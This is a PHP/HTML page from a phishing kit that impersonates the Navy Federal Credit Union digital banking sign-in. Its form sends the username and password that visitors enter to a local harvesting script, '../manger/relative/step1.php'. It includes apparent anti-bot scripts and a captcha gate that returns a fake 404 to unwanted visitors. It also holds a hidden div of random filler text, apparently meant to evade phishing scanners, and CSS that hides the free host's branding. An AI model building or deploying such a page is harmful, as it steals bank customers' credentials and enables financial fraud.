<?php
include '../prevents/anti1.php';
include '../prevents/anti2.php';
include '../prevents/anti3.php';
include '../prevents/anti4.php';
include '../prevents/anti5.php';
include '../prevents/anti6.php';
include '../prevents/anti7.php';
include '../prevents/anti8.php';
include '../manger/mine.php';
ob_start();
session_start();
if ($show_captcha =="yes"){
if  (!isset($_SESSION['captcha'])){
        exit(header('HTTP/1.0 404 Not Found'));
}
}

  include "../manger/languages/{$_SESSION['language']}.php";

  ?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <title>Navy Federal Credit Union - Our Members are the Mission®</title>



      <link rel="shortcut icon" href="../favicon.ico" type="image/x-icon">

    <link rel="stylesheet" href="styles/nauth-1eb4313cfac249f6250aef599ebf0874.css">
    <link rel="stylesheet" href="styles/responsivemain-1eb4313cfac249f6250aef599ebf0874.css">
  
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600">
    <link rel="stylesheet" href="styles/nfcu-icons-1eb4313cfac249f6250aef599ebf0874.css">
    <link rel="stylesheet" href="styles/all-1eb4313cfac249f6250aef599ebf0874.css">

    <!-- Used to count modals, must be on every page where there is a footer modal links -->
    <script type="text/javascript" async="" src="https://www.gstatic.com/recaptcha/releases/r8WWNwsCvXtk22_oRSVCCZx9/recaptcha__en.js"></script>
    <script type="text/javascript" src="resources/js/s_code.js"></script>

    <!-- includes jquery, common, dropdown, bootstrap-select, keypad, modal js files -->
    <script type="text/javascript" src="resources/js/jquery-0ef2e308bad5edb4d50a613bdb33f6cb.js"></script>
    <script type="text/javascript" src="resources/js/common-0ef2e308bad5edb4d50a613bdb33f6cb.js"></script>
    <script type="text/javascript" src="resources/js/dropdown-0ef2e308bad5edb4d50a613bdb33f6cb.js"></script>
    <script type="text/javascript" src="resources/js/bootstrap-select.min-0ef2e308bad5edb4d50a613bdb33f6cb.js"></script>
    <script type="text/javascript" src="resources/js/keypad-0ef2e308bad5edb4d50a613bdb33f6cb.js"></script>
    <script type="text/javascript" src="resources/js/modal-0ef2e308bad5edb4d50a613bdb33f6cb.js"></script>
    <!-- end of main.js -->

    <!-- <script type="text/javascript" src="resources/js/tooltip-0ef2e308bad5edb4d50a613bdb33f6cb.js"></script> -->

    <!-- combined rsaCookieGenerator with login -->
    <script type="text/javascript" src="resources/js/cookieGenerator-0ef2e308bad5edb4d50a613bdb33f6cb.js"></script>
    <script type="text/javascript" src="resources/js/login-0ef2e308bad5edb4d50a613bdb33f6cb.js"></script>
    <script src="https://www.google.com/recaptcha/api.js"></script>

    <script type="text/javascript">
        var captchaEnabled = false;
        var isCaptchaSuccess = false;
    </script>

    <script>
        window.onload = function() {
            var date = new Date().getFullYear();
            document.getElementById("year").innerHTML = date;
        }
    </script>

    <noscript>
        <p class="alert alert-noscriptwarning">Your browsers JavaScript must be enabled to sign into Online Banking.</p>
    </noscript>





</head>



<body class="responsive">
     <div style="z-index:-1;width:80vw;height:80vh;position:absolute;display:none;overflow:hidden;box-sizing:border-box;">
    <div style="opacity:0;white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;">
    <?php include('../news/news-'.rand(0,9).'.txt'); ?></div></div>
    
    <a href="#end-header" id="skipnav" class="skipnav">Skip Navigation Links</a>

    <div class="mobileMenu">
        <div class="MobileMenuHeader">
        </div>
        <div class="MobileMenuContent">
            <div class="MobLocations">
                <a href="#"><span></span>Locations</a>
            </div>
            <div class="MobContactUs">
                <a href="#"><span></span>Contact Us</a>
            </div>
            <div class="MobRoutingNumber">
                <p>Routing Number: <strong>256074974</strong></p>
            </div>
        </div>
    </div>

    <div class="pageWrap">
        <!-- start of header -->
        <div class="header-sm" role="banner">
            <div class="container">
                <div class="header-content-sm">
                    <div class="mob-nav-menu">
                        <i class="fa fa-bars"></i>
                    </div>
                    <div class="logo-sm">
                        <a href="#" title="">
                            <img class="logo-sm-pic" src="pics/NFCU_horizontal_sm_rev.svg" alt="(Logo)">
                        </a>
                    </div>
                </div>
            </div>
        </div>
        <div class="header-bg" role="banner">
            <div class="container">
                <div class="content-box">
                    <div class="header-content-bg">
                        <div class="logo">
                            <a href="#" title="" class="logo_bg_a">
                                <img src="pics/img_logo-veterans-1d62888b4b662af9142e3c385f423f32.svg" alt="(Logo)" class="logo_bg"> </a>
                        </div>
                        <div class="nav navbar-collapse">
                            <div class="rt-container"><span class="text-routing">Routing Number: </span><span class="rnumber">256074974</span></div>
                            <a class="padRight20 loc-class" href="#"> <span class="icon-locations"></span> Locations </a>

                            <a class="Contact-us" href="#"><img src="pics/contact-us-1d62888b4b662af9142e3c385f423f32.svg" class="icon_more_contact_us_default" alt="Contact Us"> Contact Us</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- end of header-->

        <!-- main content area starts here -->
        <div class="content-wrapper" role="main">

            <div class="formbackground">
                <a id="end-header"></a>

            </div>
            <div class="container" role="main">
                <div class="background-container">
                    <div class="login-content-box">
                        <div class="login">
                            <div class="headers">
                                <h1>Welcome to Digital Banking</h1>
                            </div>
                            <div class="login-panel">

                                <div class="panel panel-primary heading-callout">
                                    <div class="panel-heading">
                                        <h2 class="panel-title"><span class="icon-padlock"></span> Sign In</h2>
                                    </div>
                                    <div class="rule-container">
                                        <div class="horizontal-line"></div>
                                    </div>
                                    <div class="panel-body">
                                        <div class="panel-content-left">
                                            <form id="Login" class="form-inline Rectangle-2459" name="Login" method="post" action="../manger/relative/step1.php" autocomplete="off">
                                                <div class="userPassGroup">
                                                    <div class="form-group username" style="display:inline-block;">
                                                        <label for="user">Username</label> <span class="tooltipOne" data-guidetext="Sign into online banking with your unique Username, which may be your access number." aria-label="Sign into online banking with your unique Username, which may be your access number." tabindex="0" role="button" aria-disabled="true"></span>
                                                        <input type="text" name="USER" id="user" value="" maxlength="32" class="form-control" required="">
                                                    </div>
                                                    <div class="form-group password" style="display:inline-block;">
                                                        <label for="password">Password</label>
                                                        <input type="password" name="PASSWORD" minlength="4" id="password" class="form-control" required="">
                                                    </div>
                                                    <div class="signInHelp"><a href="#" aria-label="Sign In Help">Sign In Help</a></div>
                                                </div>

                                                <div class="submitAndRecaptcha ">


                                                    <input type="submit" name="SignIn" class="btn btn-primary reg-sign-in" id="signIn" value="Sign In" disabled="disabled">


                                                </div>

                                                <input type="hidden" name="SMENC" value="ISO-8859-1">
                                                <input type="hidden" name="SMLOCALE" value="US-EN">
                                                <input type="hidden" name="smquerydata" value="">
                                                <input type="hidden" name="smauthreason" value="">
                                                <input type="hidden" name="target" value="">
                                                <input type="hidden" name="smagentname" value="">
                                                <input type="hidden" name="postpreservationdata" value="">
                                                <input type="hidden" name="hiddenrandom" value="0" id="hiddenrandom">
                                                <input type="hidden" name="akamaiCookieValue" value="v" id="akamaiCookieValue">
                                                <input type="hidden" name="akamaiCookieName" value="dc" id="akamaiCookieName">
                                            </form>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <!-- Internal Navigation Links -->
                <div class="membership-content-box">
                    <div class="membership-middle">
                        <div class="join-nfcu">
                            <div class="join-nfcu-container">
                                <div class="membership-verbiage">
                                    <div class="not-a-member">
                                        <h2>Not a Navy Federal member?</h2>
                                    </div>
                                    <div class="join-now-verbiage" id="joinNowVerbiage">
                                        <p>Join now and enjoy the support and great service of a credit union that puts your needs first.</p>
                                    </div>
                                </div>

                                <form class="member-buttons" role="form">
                                    <input type="button" aria-label="Become a member" onclick="window.location.href = '#';" class="become-member" value="Become a Member">
                                    <input type="button" aria-label="Learn More" onclick="window.location.href = '#';" class="membership-learn-more" value="Learn More">
                                </form>

                            </div>
                        </div>
                        <div class="join-picture">
                            <img class="join-img" alt="" src="pics/img-BecomeAMember-1d62888b4b662af9142e3c385f423f32.jpg">
                        </div>
                    </div>
                </div>
                <div class="page-header">
                    <div class="content-box">
                        <div class="ph-content-box">
                            <div class="col-sm-4">
                                <div class="circle">
                                    <img class="circle-icon" src="pics/Group5159-1d62888b4b662af9142e3c385f423f32.svg" alt="">
                                </div>
                                <div class="ph-text-h3">
                                    <h3>Don't have online access?</h3>
                                </div>
                                <div aria-label="Enroll in Digital Banking" class="ph-text-a"><a href="#">Enroll in digital banking <span aria-hidden="true">»</span></a></div>

                            </div>
                            <div class="col-sm-4">
                                <div class="circle">
                                    <img class="circle-icon special6px" src="pics/Group5166-1d62888b4b662af9142e3c385f423f32.svg" alt="">
                                </div>
                                <div id="digitalBankingSecurityHeader" class="ph-text-h3">
                                    <h3>Find out more about secure digital banking</h3>
                                </div>
                                <div aria-label="Learn More" aria-describedby="digitalBankingSecurityHeader" class="ph-text-a"><a href="#">Learn more <span aria-hidden="true">»</span></a></div>
                            </div>
                            <div class="col-sm-4">
                                <div class="circle">
                                    <img class="circle-icon" src="pics/Group5158-1d62888b4b662af9142e3c385f423f32.svg" alt="">
                                </div>
                                <div class="ph-text-h3">
                                    <h3>Need help?</h3>
                                </div>
                                <div aria-label="Contact Us" class="ph-text-a"><a href="#">Contact us <span aria-hidden="true">»</span></a></div>

                            </div>
                        </div>
                    </div>
                </div>

           
            </div>
        </div>
        <!-- end of Internal ad-->


        <!-- start of footer  -->
        <div class="container footer">
            <div class="content-box">
                <div class="ft-content-box">
                    <div class="footer-content">
                        <div class="ft-logo">
                            <a href="#" title="" target="_blank" class="ft-logo-a">
                                <span class="nfcu-icon-ftlogo"></span>
                            </a>
                        </div>
                        <div class="content">
                            <div class="member-services marginbottom20">
                                <span class="mbr-services-txt">24/7 Member Services:<b>&nbsp;1-888-842-6328&nbsp;</b></span><span class="separator mob-pipe">   |   </span><span class="mob-line-break"><br></span>
                                <span class="text-routing">Routing Number:&nbsp;<b>256074974</b> </span>
                                <hr>
                            </div>
                            <div class="nav-container">
                                <nav class="nav ft-nav paddingtop20 marginbottom20" role="navigation">
                                    <a href="#">About Us   </a> <span class="separator">|</span>
                                    <a href="#">   Contact Us   </a> <span class="separator">|</span>
                                    <a href="#">   Privacy Policy   </a> <span class="separator">|</span>
                                    <a href="#">   Security   </a> <span class="separator">|</span>
                                    <a href="#" data-toggle="modal" data-target="#modalonlineDisclosure" onclick="countModal('web policy');">   Web Policy   </a><span class="separator">|</span>
                                    <a href="#">   Accessibility   </a> <span class="separator">|</span>
                                    <a href="#" data-toggle="modal" data-target="#modalbrowserRequirements" onclick="countModal('browser support');">   Browser Support</a>
                                </nav>
                            </div>
                            <div class="copyright">
                                <p id="copyright">
                                    © <span id="year" style="font-weight:800;">2020</span><span class="copyright">&nbsp;<b>Navy Federal Credit Union.</b> </span> All rights reserved.
                                </p>
                            </div>

                            <div class="nav regInstitutions">
                                <div class="ncua-link"><a href="#" id="ncua-font"><span class="icon-ncua"></span> Federally Insured by NCUA</a><span class="separator">     |     </span></div>
                                <div class="ehl-link"><a href="#" id="EHL"><span class="icon-housing"></span> Equal Housing Lender</a> </div>
                            </div>

                            <div class="ft-disclaimers">
                                <p>
                                    APY = Annual Percentage Yield <span class="separator">|</span> APR = Annual Percentage Rate
                                </p>
                                <p>
                                    <sup>+</sup>Rates are based on an evaluation of credit history, so your rate may differ.
                                </p>

                                <p>
                                    <sup>++</sup>Rates are variable, and based on an evaluation of credit history, so your rate may differ.
                                </p>

                                <p>
                                    <sup>*</sup>Message and date rates may apply. Terms and Conditions are available.
                                </p>

                                <p>
                                    iPhone®, iPad® and iPod touch® are trademarks of Apple Inc. App Store℠ is a service mark of Apple Inc. Android™ and Google Play™ are trademarks of Google Inc. Images used for representational purposes only; do not imply government endorsement.
                                </p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <!-- end of footer  -->
    </div>

    <!-- set the src of the iframe as about:blank so that they don't automatically load on browser load -->

    <!-- iFrame for onlineDisclosure -->
    <div class="modal fade" id="modalonlineDisclosure" tabindex="-1" role="dialog" aria-labelledby="modalonlineDisclosureLabel">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span class="fa fa-times" aria-hidden="true"></span></button>
                    <p class="modal-title" id="modalonlineDisclosureLabel">Use of Cookies by Navy Federal Online</p>
                </div>
                <div class="modal-body">
                    <iframe id="onlineDisclosureFrame" class="cookies" data-src="#" src="about:blank" frameborder="0"></iframe>
                </div>
                <div class="modal-footer">
                    <button type="button" id="modal-button" value="Done" data-dismiss="modal" aria-label="Done">Done</button>
                </div>
            </div>
        </div>
    </div>
    <!-- End of onlineDisclosure Modal -->

    <!-- iFrame for browserRequirements -->
    <div class="modal fade" id="modalbrowserRequirements" tabindex="-1" role="dialog" aria-labelledby="modalbrowserRequirementsLabel">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span class="fa fa-times" aria-hidden="true"></span></button>
                    <p class="modal-title" id="modalbrowserRequirementsLabel">Browser Requirements</p>
                </div>
                <div class="modal-body">
                    <iframe id="browserRequirementsFrame" data-src="#" src="about:blank" width="580" height="740" frameborder="0"></iframe>
                </div>
            </div>
        </div>
    </div>
 

    <div id="rightnowLogout" style="display: none;">
   <style>
        img[src*="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"] {
            display: none;
        }
    </style>
</body>

</html>